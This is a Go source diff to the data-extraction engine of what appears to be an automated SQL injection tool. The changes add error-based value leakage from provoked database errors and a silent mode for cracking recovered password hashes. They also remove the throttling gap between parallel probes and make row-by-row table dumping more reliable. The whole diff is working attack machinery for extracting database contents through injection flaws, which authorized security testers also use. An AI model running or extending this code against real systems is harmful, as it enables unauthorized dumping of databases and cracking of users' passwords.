@@ -5,11 +5,13 @@
 package enumeration
 
 import (
+	"bytes"
 	"context"
 	"encoding/base64"
 	"errors"
 	"fmt"
 	"io"
+	"regexp"
 	"sort"
 	"strings"
 	"sync"
@@ -25,7 +27,7 @@ import (
 
 // Defaults for the blind extraction engine.
 const (
-	DefaultConcurrency = 10 // parallel character workers
+	DefaultConcurrency = 20 // parallel character workers
 	DefaultTimeDelay   = 5  // seconds for time-based probes
 	DefaultRequestGap  = 50 * time.Millisecond
 )
@@ -88,6 +90,9 @@ type Options struct {
 	Sleep       int           // seconds for time-based probes
 	Progress    io.Writer     // progress stream (defaults to stderr)
 	Meter       *common.Meter
+	// Crack controls dictionary cracking of recovered password hashes
+	// (CrackPrompt asks first, CrackForce runs silently, CrackNever disables).
+	Crack CrackPolicy
 }
 
 // Extractor turns an arbitrary SQL expression into a value, character by
@@ -101,6 +106,20 @@ type Extractor struct {
 	base    *common.Baseline
 	queries *dbms.Queries
 	extract dbms.Extract
+
+	// error-based leak channel state (MySQL and friends when verbose errors).
+	errChans   []dbms.ErrorFn
+	detPayload string
+	errPrefix  string
+	errSuffix  string
+	errChan    *dbms.ErrorFn
+	errKnown   bool
+	errBroken  bool
+	errMut     sync.Mutex
+
+	// last DBMS error text observed, for diagnostics.
+	errSnippet string
+	snippetMut sync.Mutex
 
 	throttle common.Throttle
 	timeout  time.Duration
@@ -123,7 +142,7 @@ func NewExtractor(det sqli.Detection, client *httpclient.Client, opts Options) *
 		opts.Concurrency = DefaultConcurrency
 	}
 	if opts.Timeout <= 0 {
-		opts.Timeout = 10 * time.Second
+		opts.Timeout = 8 * time.Second
 	}
 	if opts.Sleep <= 0 {
 		opts.Sleep = DefaultTimeDelay
@@ -150,14 +169,13 @@ func NewExtractor(det sqli.Detection, client *httpclient.Client, opts Options) *
 	}
 	if x.queries != nil {
 		x.extract = x.queries.Extract
+		x.errChans = append([]dbms.ErrorFn(nil), x.queries.Extract.Errors...)
 	}
+	x.detPayload = det.Payload
 	return x
 }
 
-func optionsGap(o Options) time.Duration {
-	if o.Concurrency > 1 {
-		return DefaultRequestGap
-	}
+func optionsGap(_ Options) time.Duration {
 	return 0
 }
 
@@ -182,7 +200,45 @@ func (x *Extractor) send(ctx context.Context, value string) (*httpclient.Respons
 	if rr == nil {
 		return nil, errors.New("injection point cannot render request")
 	}
-	return common.Do(ctx, x.client, x.throttle, rr.Method, rr.URL, rr.Body, rr.Headers, x.timeout, x.meter)
+	resp, err := common.Do(ctx, x.client, x.throttle, rr.Method, rr.URL, rr.Body, rr.Headers, x.timeout, x.meter)
+	if err == nil && resp != nil {
+		x.recordErrorSnippet(resp.Body)
+	}
+	return resp, err
+}
+
+// recordErrorSnippet keeps a bounded window of the most recent verbose DBMS
+// error response for diagnostics.
+func (x *Extractor) recordErrorSnippet(body []byte) {
+	_, ev := dbms.MatchError(body)
+	if ev == "" {
+		return
+	}
+	const window = 220
+	i := strings.Index(string(body), ev)
+	if i < 0 {
+		i = 0
+	}
+	start := i - window/2
+	if start < 0 {
+		start = 0
+	}
+	end := start + window
+	if end > len(body) {
+		end = len(body)
+	}
+	snippet := string(bytes.TrimSpace(body[start:end]))
+	x.snippetMut.Lock()
+	x.errSnippet = snippet
+	x.snippetMut.Unlock()
+}
+
+// LastErrorSnippet returns the most recent verbatim DBMS error text observed,
+// or "" when none has been seen yet.
+func (x *Extractor) LastErrorSnippet() string {
+	x.snippetMut.Lock()
+	defer x.snippetMut.Unlock()
+	return x.errSnippet
 }
 
 // sendRaw transmits an explicit rendered request (used by direct techniques).
@@ -338,11 +394,23 @@ func (x *Extractor) ExtractInt(ctx context.Context, expr string) (int64, error) 
 	return parseInt(s)
 }
 
-// ExtractString extracts a string scalar value from a 1x1 SELECT expression
-// (typically the query text of a scalar function like "SELECT user()"). For
-// blind techniques it first detects the length, then extracts each character
-// in parallel. For direct techniques it reflects the full value in one request.
+// ExtractString extracts a scalar value from a 1x1 SELECT expression (e.g.
+// "SELECT user()"). For error-based techniques it reads the value directly out
+// of a provoked DBMS error; for everything else it falls back to the blind
+// engine (length detection then per-character probes).
 func (x *Extractor) ExtractString(ctx context.Context, expr string) (string, error) {
+	if x.tech == techniques.TechError && len(x.errChans) > 0 && !x.errBroken {
+		if val, err := x.errorString(ctx, expr); err == nil {
+			return val, nil
+		}
+		// calibration already failed once → avoid hammering; fall back blind.
+	}
+	return x.blindString(ctx, expr)
+}
+
+// blindString extracts the value character by character (boolean or time
+// channel). It first detects the length to bound the character scan.
+func (x *Extractor) blindString(ctx context.Context, expr string) (string, error) {
 	if x.extract.CharAt == nil || x.extract.Length == nil {
 		return "", fmt.Errorf("string extraction unsupported for %s", x.db)
 	}
@@ -352,7 +420,10 @@ func (x *Extractor) ExtractString(ctx context.Context, expr string) (string, err
 		if errors.Is(err, context.Canceled) {
 			return "", err
 		}
-		// A length of 0 (empty) is valid — not an error.
+		// No working oracle (boolean/time channels are undecidable), so we
+		// cannot read the value. Surface the failure instead of returning a
+		// silent empty result — an empty dump hides real extraction problems.
+		return "", fmt.Errorf("cannot determine value length: %w", err)
 	}
 	if length == 0 {
 		return "", nil
@@ -559,8 +630,9 @@ func (x *Extractor) binarySearchByte(ctx context.Context, codeExpr string) (int,
 // simple SELECT (no subqueries in the select list) so its output columns can be
 // reliably aliased for offset-based cell access.
 func (x *Extractor) ExtractRows(ctx context.Context, query string, cols int) ([][]string, error) {
-	// Row count first.
-	countExpr := "count(*) FROM (" + query + ") AS x"
+	// Row count first. The fragment is wrapped as a scalar subquery so it is a
+	// valid expression inside blind length probes and error-channel reads.
+	countExpr := "(SELECT count(*) FROM (" + query + ") AS x)"
 	rowCount, err := x.ExtractInt(ctx, countExpr)
 	if err != nil {
 		return nil, fmt.Errorf("row count: %w", err)
@@ -592,8 +664,25 @@ func (x *Extractor) ExtractRows(ctx context.Context, query string, cols int) ([]
 
 // cellExpr produces a scalar expression yielding the cell at (row, col) of an
 // aliased derived table using LIMIT/OFFSET (works on MySQL/Postgres/SQLite).
+// The LIMIT is placed inside the derived table so the backend applies any
+// ORDER BY before the offset is taken, keeping row order deterministic even on
+// MySQL where a bare derived-table ORDER BY can be optimised away.
 func cellExpr(aliasedQuery string, col int, row int64) string {
-	return "SELECT " + colName(col) + " FROM (" + aliasedQuery + ") AS x LIMIT 1 OFFSET " + itoa(row)
+	return "SELECT " + colName(col) + " FROM (" + appendLimitOffset(aliasedQuery, row) + ") AS x"
+}
+
+// trailingLimit matches a LIMIT ... / LIMIT ... OFFSET ... clause at the very
+// end of a query so appendLimitOffset does not produce two LIMIT clauses.
+var trailingLimit = regexp.MustCompile(`(?is)\s+LIMIT\s+\d+\s*(OFFSET\s+\d+)?\s*$`)
+
+// appendLimitOffset appends " LIMIT 1 OFFSET row", dropping any existing
+// trailing LIMIT clause first.
+func appendLimitOffset(query string, row int64) string {
+	if row < 0 {
+		row = 0
+	}
+	q := trailingLimit.ReplaceAllString(query, "")
+	return q + " LIMIT 1 OFFSET " + itoa(row)
 }
 
 func colName(c int) string {
